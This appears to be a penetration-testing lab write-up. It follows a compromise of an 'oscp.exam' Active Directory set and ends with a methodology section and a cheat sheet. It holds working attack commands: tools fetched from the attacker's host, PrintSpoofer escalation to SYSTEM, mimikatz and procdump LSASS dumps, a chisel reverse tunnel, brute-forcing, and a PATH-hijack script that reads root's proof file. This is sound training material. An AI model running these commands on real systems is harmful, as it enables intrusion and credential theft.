01

Reconnaissance

One routable host, two networks

This set is not a box, it is a domain. oscp.exam sits behind a dual-homed member server, and the first job was to work out which parts of it I could actually reach from Kali.

1.1 Host discovery

command
nmap -sn 192.168.118.0/24 -oG - | grep -i up | awk '{print $2}'
output
192.168.118.147
192.168.118.149
192.168.118.150
192.168.118.151
192.168.118.254

Five live addresses. .254 is the gateway. Working each target down:

Host Identity Bearing on this chain
192.168.118.147 Windows Server 2019 build 19041, MS01.oscp.exam the door — domain-joined, dual-homed
192.168.118.149 Ubuntu, only 21/22/80 credential-gated, nothing anonymous
192.168.118.150 Ubuntu, Spring Boot API on 8080 separate box
192.168.118.151 Windows Server 2019, WORKGROUP separate box, not domain-joined
192.168.118.254 gateway infrastructure

Only .147 is domain-joined, so only .147 can lead into the domain.

1.2 Ports that matter

command
nmap -p- --min-rate 2000 -T4 -oN scans/ms01-allports.txt 192.168.118.147
nmap -sVC -p 445,5985 -oN scans/ms01-services.txt 192.168.118.147

Full scan output is not committed — scans/ is in .gitignore. The two ports below are the only ones that changed the next step.

Port Service What it gave
445/tcp SMB hostname MS01, domain oscp.exam, signing: False
5985/tcp WinRM the way in, once a credential existed

The SMB fingerprint is one command and tells you the shape of the whole set:

command
nxc smb 192.168.118.147

Condensed from the session:

Field Value
Hostname MS01
Domain oscp.exam
OS Windows Server 2019 build 19041
SMB signing False

Two things to carry forward: the host is a domain member, and SMB signing is off — which is a relay opportunity, and also a hint that the set was built to be attacked from the middle, not from the edge.

1.3 The network that is not there

DC01.oscp.exam is the domain controller. It is not in 192.168.118.0/24, and there is no route to it from Kali: the lab hands out a route for the Kali-facing subnet only, so packets aimed at 10.10.118.0/24 leave tun0 and die at the gateway.

That is confirmed later, from the other side — ipconfig /all on MS01 shows a second NIC on 10.10.118.0/24 with 10.10.118.146 as its DNS server. The DC is one hop away from MS01 and invisible from Kali. Everything after the foothold is therefore a pivoting problem before it is an Active Directory problem.

1.4 The starting credential

The set is provisioned with one domain account:

Account Secret Rights
OSCP\eric.wallows EricLikesRunning800 domain user — not a local administrator

Checked over SMB before anything else:

command
nxc smb 192.168.118.147 -u eric.wallows -p 'EricLikesRunning800'
output
SMB         192.168.118.147  445    MS01    [+] oscp.exam\eric.wallows:EricLikesRunning800

[+] with no (Pwn3d!) — the credential authenticates, and that is all it does over SMB. The same account is a member of BUILTIN\Remote Management Users, which is the more interesting fact: it is enough to open a WinRM session without being an administrator anywhere.

That is the whole reconnaissance result: one host, one valid credential, one service that turns the credential into a shell.

1.5 Gotchas

  • -d oscp for NTLM-facing tools (nxc, hydra); -d oscp.exam for Kerberos-facing ones (certipy, impacket with -k). Mixing them produces authentication errors that look like bad passwords.
  • The NetBIOS name is OSCP, the DNS domain is oscp.exam. whoami returns oscp\eric.wallows even though nothing in the DNS namespace is called oscp.
02

Foothold

WinRM as eric.wallows

The credential is not an administrator, so SMB gives nothing beyond a [+]. WinRM is different: BUILTIN\Remote Management Users is enough to get a shell, and a shell is enough to look at the token.

2.1 One command to a shell

command
nxc winrm 192.168.118.147 -u eric.wallows -p 'EricLikesRunning800' -x whoami
output
oscp\eric.wallows

Or interactively:

command
evil-winrm -i 192.168.118.147 -u eric.wallows -p 'EricLikesRunning800'

Either way the result is the same: code execution as a plain domain user on a domain-joined server, with no local administrative rights.

2.2 Reading the token

command
whoami
whoami /groups
whoami /priv

whoami confirms the domain context:

output
oscp\eric.wallows

The parts of whoami /groups that matter, condensed:

Group / label SID Why it matters
BUILTIN\Users S-1-5-32-545 no administrative group anywhere in the token
BUILTIN\Remote Management Users S-1-5-32-580 this is the group that allowed WinRM
NT AUTHORITY\NETWORK S-1-5-2 logon is over the network, not interactive
Mandatory Label\High Mandatory Level S-1-16-12288 full token — not a privilege

And the two privileges that decide the rest of the box:

Privilege State Consequence
SeImpersonatePrivilege Enabled impersonate any token that connects to a service we control → SYSTEM
SeDebugPrivilege absent cannot open LSASS from this token

2.3 Two things that look wrong

High integrity without administrative rights. A remote network logon is not UAC-filtered the way an interactive logon is, so the token is a full one and carries the High mandatory label. The label describes the token, not what the account is allowed to do — BUILTIN\Administrators is still missing from the group list, and nothing administrative works.

SeImpersonatePrivilege on a normal user. Normally only service accounts (LocalSystem, NetworkService, virtual accounts) hold this. Here it is in the base token of a domain user, which is the entire escalation path handed over in advance: any process that can be made to authenticate to a named pipe we own can be impersonated, and the classic result is nt authority\system.

Verifying the negative is worth the ten seconds, because it changes the plan:

command
net config workstation
output
System error 5 has occurred.

Access is denied.

That is expected for a non-administrator and is not a broken host — net config reads from a privileged registry path. whoami /groups already gave the same answer without the error.

2.4 Next

SeImpersonatePrivilege plus a local service that can be coerced into authenticating is a well-trodden path: a potato. Chapter 03 runs it.

03

Privilege escalation

SeImpersonate → SYSTEM with PrintSpoofer

A potato attack needs three things: SeImpersonatePrivilege (confirmed in chapter 02), a privileged account that can be made to authenticate to something we control, and a way to catch that authentication. PrintSpoofer gets the second from the Print Spooler and the third from a named pipe.

3.1 Stage the binary

The kit lives on Kali and is served once for the whole set:

command
cd ~/kit && python3 -m http.server 8000

On MS01 the download has to use capital -O; curl.exe -o without a filename writes nothing useful on Windows:

command
curl.exe -O http://192.168.45.158:8000/PrintSpoofer64.exe

Check what arrived before running it — the size is a cheap integrity check:

command
Get-Item .\PrintSpoofer64.exe | Select-Object Name,Length
Binary Size (bytes) Used
PrintSpoofer64.exe 27,136 yes
GodPotato-NET4.exe 57,344 fallback
JuicyPotatoNG.exe 153,600 fallback
procdump64.exe 743,752 chapter 04

3.2 Run it

command
.\PrintSpoofer64.exe -c "whoami"

The tool prints its progress (privilege found, named pipe listening, CreateProcessAsUser() OK) and then the output of the command — which is the point:

output
nt authority\system

That is the box. An interactive SYSTEM shell is the same call with -i:

command
.\PrintSpoofer64.exe -i -c powershell.exe
output
PS C:\Users\eric.wallows\Desktop> whoami
nt authority\system

From here everything is local: LSASS is readable, the service control manager is writable, and the second network card is reachable. Those are chapters 04 and 05.

3.3 Why this potato

PrintSpoofer targets the Print Spooler: it creates a named pipe, asks the spooler to connect to it, and impersonates the resulting SYSTEM token. It works on the 19041 build in this set because the spooler is running and the token carries SeImpersonatePrivilege.

Fallbacks, in the order I would try them:

Binary When
GodPotato-NET4.exe spooler disabled; uses DCOM/RPC and works on Server 2019+
JuicyPotatoNG.exe older builds where the DCOM OXID resolution trick still applies

All three fail the same way if the token is filtered rather than privileged — if whoami /priv does not show SeImpersonatePrivilege, stop and look for a different escalation instead of trying another potato.

3.4 Gotchas

  • %TEMP% is a cmd.exe variable. In PowerShell it is $env:TEMP, and cd %TEMP% silently creates a directory literally called %TEMP%.
  • PowerShell parses per line — never split an if/else across two pasted lines in a WinRM shell.
  • Upload direction matters: curl.exe -T file http://… uploads, -O downloads.
04

Credentials

What LSASS would and would not give

SYSTEM on a member server is usually worth a domain credential, and a domain credential is usually worth a hop. This chapter is the check that decides whether that assumption holds.

4.1 The failure that explains itself

Before escalating, mimikatz was run from the unprivileged WinRM session:

command
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

It failed with 0xC0000061 — STATUS_PRIVILEGE_NOT_HELD. sekurlsa needs to open lsass.exe with PROCESS_VM_READ, and that needs SeDebugPrivilege. Chapter 02 already showed the privilege was absent from the token, so this was never a tooling problem: privilege::debug had nothing to enable.

That is the useful part of the error. A 0xC0000061 is not "mimikatz is blocked"; it is "this token cannot read LSASS", and the fix is a token that can.

4.2 The same command as SYSTEM

From the nt authority\system shell:

command
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

privilege::debug now succeeds, lsass.exe opens, and the dump completes. The result, recorded honestly:

Looked for Found
Domain Admin NTLM hash no
Domain Admin cleartext no
krbtgt material no
Reusable service-account credential nothing that granted new rights

No credential with domain-wide rights came out of LSASS on MS01.

4.3 Why that is a real answer, not a bad dump

It is worth ruling out the boring explanations before concluding anything:

  • The dump ran as SYSTEM, so the handle to LSASS was not the blocker (4.1 proved that).
  • sekurlsa::logonpasswords enumerates every logon session the host knows about. A DC that has never logged on to MS01 cannot leave a DA credential there.
  • MS01 is a member server with a single interactive user (eric.wallows). Nothing in the set's design puts a Domain Admin on it.

So the negative is structural: MS01 is a stepping stone, not a vault. The domain tier has to be reached from a host that actually holds domain-tier material, or through a misconfiguration in AD itself.

4.4 If mimikatz is blocked

The fallback that avoids touching LSASS with a signed binary at all is a full dump and an offline read:

command
.\procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
command
.\mimikatz.exe "sekurlsa::minidump C:\Windows\Temp\lsass.dmp" "sekurlsa::logonpasswords" exit

The dump is large and it is a credential artefact — it stays on the host and is deleted during cleanup. It is never copied back to Kali or committed anywhere.

4.5 What the negative changes

  • Do not spend time cracking MS01's local hashes hoping for reuse; the useful next step is the network behind MS01, not its SAM.
  • Do not assume DA lives on the DC only — a second member server (MS02) is the more likely holder of a privileged session, because administrators log on to servers they manage.
  • BloodHound becomes the tool of choice: AdminTo, CanPSRemote, and ACL edges from ERIC.WALLOWS describe the intended path through the domain without guessing.

Chapter 05 builds the route to the hosts that can answer those questions.

05

Pivot

chisel into 10.10.118.0/24

MS01 has two network cards and Kali can reach only one of them. Everything after this chapter runs through a SOCKS proxy that MS01 opens back to us.

5.1 The second network card

command
ipconfig /all

Condensed:

Interface IPv4 Gateway DNS
NIC 1 — Kali-facing 192.168.118.147/24 192.168.118.254 —
NIC 2 — internal 10.10.118.147/24 none 10.10.118.146

Two facts decide the design:

  • No gateway on NIC 2. MS01 can reach 10.10.118.0/24 and nothing beyond it. It is not a router by default, so I cannot simply add a route and point Kali at it.
  • DNS is the DC. 10.10.118.146 is DC01.oscp.exam, which confirms the domain controller's address without ever touching it.

The cheap host discovery is the neighbour table, before any scanning:

command
arp -a
route print

arp -a only shows hosts MS01 has already talked to; a sweep of the /24 fills in the rest.

5.2 Reverse SOCKS with chisel

The direction matters: MS01 cannot accept inbound connections from Kali on the internal network, so the tunnel is built outbound from MS01 and the listening end is on Kali.

On Kali, serve the binary over the existing HTTP server and start the chisel server:

command
cd ~/kit/lateral && python3 -m http.server 8000
command
chisel server -p 8001 --reverse

On MS01, fetch the client and connect back:

command
curl.exe -O http://192.168.45.158:8000/chisel.exe
.\chisel.exe client 192.168.45.158:8001 R:socks

The client logs socks proxy listening on 127.0.0.1:1080. That is the whole tunnel: a SOCKS5 listener on Kali, with MS01 as the exit node on 10.10.118.0/24.

Use 8001 for chisel and leave 8000 for the HTTP server — colliding them produces a bind error that looks like a chisel failure.

5.3 proxychains

The default Kali config points at Tor. It has to become the chisel listener, and it has to be socks5 — socks4 against chisel's SOCKS5 listener fails with unhelpful connection errors:

output
[ProxyList]
socks5 127.0.0.1 1080

Confirm the edit before blaming the tunnel:

command
tail -3 /etc/proxychains4.conf

5.4 Using it

Always -q: proxychains otherwise prints a banner per connection and drowns the tool output.

command
proxychains4 -q nxc smb 10.10.118.0/24
command
proxychains4 -q nmap -sT -Pn -p 88,135,139,389,445,464,636,3268,5985 --open 10.10.118.146

Two constraints worth remembering:

  • Only TCP connect scanning works through SOCKS. -sS, -O, and most of -A do not; use -sT -Pn.
  • ICMP does not traverse the proxy, so every host looks down until a TCP port answers. -Pn is mandatory, and a "dead" host is only dead on TCP.

The sweep returns the domain controller and a second member server. That second server is MS02 — chapter 06.

5.5 The no-chisel alternative

If a tool refuses to work through proxychains, MS01 can forward a single port instead. As SYSTEM:

command
netsh interface portproxy add v4tov4 listenaddress=192.168.118.147 listenport=5985 connectaddress=10.10.118.<ms02> connectport=5985
netsh advfirewall firewall add rule name="winrm-fwd" dir=in action=allow protocol=TCP localport=5985

Kali then talks to 192.168.118.147:5985 as if it were the internal host. It is one port per command and it has to be removed afterwards:

command
netsh interface portproxy reset
netsh advfirewall firewall delete rule name="winrm-fwd"

Slower to set up than chisel, but it survives tools that cannot be proxy-aware — and it is the fallback when a SOCKS proxy breaks a protocol that needs real source addresses.

06

MS02

The second hop

Pending capture. This leg is not written up yet. The chapter is published as a placeholder so the chain is complete and the gap is visible — it will be replaced with the as-executed writeup, not a reconstruction.

6.1 Where MS02 sits

MS02 is the second member server, reachable only through the SOCKS tunnel from chapter 05. It is the host that makes the rest of the chain plausible: administrators log on to member servers, so a privileged session or a reusable local credential is far more likely to be cached there than on MS01, whose LSASS held nothing domain-tier (chapter 04).

6.2 How it will be documented

The chapter will cover, in order:

  1. Discovery — the 10.10.118.0/24 sweep through proxychains, the host's name and OS, and which ports answered (445, 5985, 3389 are the ones that matter on a member server).
  2. Access — the credential or technique that opened it, and why that credential existed at all.
  3. Local enumeration — who is logged on, what the token holds, and whether the host is a dead end like MS01 or holds the next hop.
  4. The artefact — the hash, ticket, or credential that unlocks DC01, and the check that proves it is domain-tier before using it.

6.3 Commands that carry over

Everything from chapter 05 applies unchanged; only the target address changes:

command
proxychains4 -q nxc smb 10.10.118.0/24
proxychains4 -q nxc winrm 10.10.118.0/24 -u <user> -p '<password>'

Anything that needs a real network stack (LSASS dumps, SharpHound, RDP) runs from MS01 or from MS02 itself, not through the proxy.

08

Methodology

The repeatable per-box loop

The loop I run on every box, in order, with the rule that makes each step worth its time. This is deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only where evidence points.

Phase 0 — Setup

command
mkdir -p /tmp/<box> && cd /tmp/<box>
export TARGET=<ip>

Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the report afterwards trivial and stops me confusing two boxes' output.

Phase 1 — Reachability and TCP

Step Command Rule
Ping ping -c 2 -W 2 $TARGET TTL tells you the OS before you scan (64 Linux, 128 Windows)
Full TCP nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET Always -p-. A top-1000 scan is a guess
Versions nmap -sV -sC -p<open> -oN services.txt $TARGET Only the open ports; -sC is cheap and occasionally decisive

Decision: for each open port, ask "what is the configuration weakness most likely to be, given this version?" Version CVEs come last — most boxes are misconfigured, not unpatched.

Phase 2 — UDP (do not skip this)

command
nmap -sU --top-ports 30 -T4 --max-retries 1 --host-timeout 180s $TARGET

If 161/udp is open:

command
for c in public private manager internal; do
  snmpwalk -v1 -c "$c" -t 5 -r 1 $TARGET 1.3.6.1.2.1.1 2>&1 | head -3
done

Then, on success, always:

command
snmpwalk -v1 -c public $TARGET 1.3.6.1.4.1.8072.1.3.2   # nsExtendTable — the money tree
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2   # process names
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.6.3.1.2   # installed packages
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.4.20.1.1     # interface IPs

nsExtendTable gives you the commands the agent runs plus the admin's own description of them. Descriptions are written for an internal audience and routinely name accounts and policies.

Phase 3 — Per-service enumeration

For each service, in the order that historically pays fastest.

HTTP/HTTPS

command
curl -s -i http://$TARGET/ | head -20          # stock page? framework? redirect?
for p in robots.txt sitemap.xml .git/ .htaccess server-status; do
  curl -s -o /dev/null -w "%{http_code} %{size_download}  /$p\n" http://$TARGET/$p
done
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 40 -d 2 --smart --no-state -q
  • Note the 404 body size — it is your filter for everything after.
  • Vhosts: ffuf -u http://$TARGET/ -H "Host: FUZZ" -w <subdomains> -fr "<default page text>".
  • Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.

FTP

command
ftp -n -v $TARGET <<< $'user anonymous anon@test\nls\nbye'   # 530 on USER = anonymous_enable=NO
hydra -L users.txt -P pass.txt -t 4 -f ftp://$TARGET

Try the account name as the password. Check for key material, configs, and backups in the data directory — a shared /srv/ftp often leaks a different account's secrets.

SSH

command
ssh -i key -o BatchMode=yes user@$TARGET id      # never point a key at a host without -o BatchMode
ssh-keygen -l -f key                             # read the comment first: it names the user

SMB

command
nxc smb $TARGET -u '' -p '' --shares
nxc smb $TARGET -u guest -p '' --shares
nxc smb $TARGET -u user -p pass -d DOMAIN --shares

Phase 4 — Foothold

Get a shell, then immediately stabilise and record identity:

command
id; hostname; sudo -n -l; uname -a

Do not start hunting for privesc before you know exactly which uid and groups you hold — the escalation path depends on it.

Phase 5 — Local enumeration (Linux)

Send one script over one connection and read one report:

command
ssh user@$TARGET 'bash -s' < enum.sh

Checklist, in the order that finds things:

# Check Command
1 sudo rights sudo -n -l
2 SUID, excluding snap noise find / -perm -4000 -type f 2>/dev/null \| grep -v '^/snap'
3 Capabilities getcap -r / 2>/dev/null
4 Cron cat /etc/crontab; ls -la /etc/cron.*
5 Writable service files find / -writable -type f -path '*/etc/*' 2>/dev/null
6 Listening sockets ss -tlnp
7 Home directories ls -la /home/* — this box had the SUID helper in a user's home
8 History and keys ls -la ~/.ssh; cat ~/.bash_history
9 Kernel uname -a — only if 1–8 are empty
10 Password reuse the foothold password against sudo -S and other users

Rule: a custom SUID binary beats every generic exploit. Read it before reaching for linpeas output tables.

Phase 6 — Binary analysis (when a SUID binary looks custom)

command
file /path/binary                    # not stripped? then function names survive
strings -a /path/binary | head -40   # look for system, popen, exec*, and bare command names
objdump -d -M intel /path/binary | sed -n '/<main>:/,/^$/p'
readelf -d /path/binary | grep -E 'BIND_NOW|FLAGS'   # is RELRO full? (memory bugs are then out)

What you are looking for, in priority order:

  1. system() / popen() with a bare command name → PATH hijack (CWE-426)
  2. setuid(0)/seteuid(0) before that call → the shell will not drop privileges → full root
  3. A writable path used by root → symlink or overwrite attack
  4. A shell escape in a pager/editor it invokes

If the binary is setuid and setgid, or lives in a user-writable directory, the box author is telling you this is the path.

Phase 7 — Post-exploitation and reporting

command
cat /root/proof.txt; cat /home/*/local.txt
ip a; ip r          # can this host pivot? (single NIC + default route = no)

Record: exact flags, the id output as root, the mechanism in one paragraph, and every command with its output. Then clean up.

Cleanup checklist

  • Remove every file you created, then verify with ls.
  • Revert any file you modified.
  • Do not change credentials you do not own; if an exploit would have (this box's chpasswd), note that it did not run.
  • Note in the report what you changed and what you left alone.

Timeboxing heuristics

Situation Budget Move on when
Web on a stock default page 10 min Two wordlists + vhosts agree there is nothing
Version-CVE rabbit hole 5 min The package revision shows the backport
Credential guessing 5 min per service Account-specific defaults exhausted
Generic privesc sweep 15 min A custom SUID/service/cron finding exists

The recurring lesson: spend the time on the surface you have not looked at, not on the one you have already disproved. On this box, thirty UDP ports were worth more than an hour of web.

Cheat sheet

Every command, with the flag that matters

Only commands I have actually needed, with the small flag that matters each time.

Scanning

command
## full TCP, fast — always -p-
nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $T

## versions + default scripts on the ports that matter
nmap -sV -sC -p21,22,80 -oN services.txt $T

## UDP: the phase everyone skips
nmap -sU --top-ports 30 -T4 --max-retries 1 --host-timeout 180s $T

## live hosts
nmap -sn 192.168.245.0/24 -oG - | grep -i up | awk '{print $2}'

SNMP

command
## find the community string
for c in public private manager internal; do
  echo "== $c"; snmpwalk -v1 -c "$c" -t 5 -r 1 $T 1.3.6.1.2.1.1 2>&1 | head -3
done

## full walk to a file, then grep it

Binary analysis

command
file bin                                  # "not stripped" = function names survive
strings -a bin | head -40                 # system / popen / exec / bare command names
objdump -d -M intel bin | sed -n '/<main>:/,/^$/p'

objdump -s -j .rodata bin | head          # resolve the strings passed to system()

output
+ setuid / setgid  →  setuid(0); setgid(0);
+ lea rdi,[rip+...] →  the argument is a fixed string
+ call system@plt  →  system("...")

Privesc — PATH hijack template

command
D=$(mktemp -d /tmp/x.XXXXXX)
cat > "$D/chpasswd" <<'EOF'
#!/bin/bash
id > /tmp/root_id.txt
cat /root/proof.txt > /tmp/root_proof.txt 2>&1
chmod 644 /tmp/root_id.txt /tmp/root_proof.txt
EOF
chmod +x "$D/chpasswd"

## name the faked binary exactly as the SUID program invokes it
PATH="$D:$PATH" /path/to/suid_binary

cat /tmp/root_id.txt

Works only when the SUID binary calls setuid(0)/seteuid(0) before system(). If it does not, the shell drops privileges and the payload runs as you. Check the disassembly order first.

Interactive variant:

command
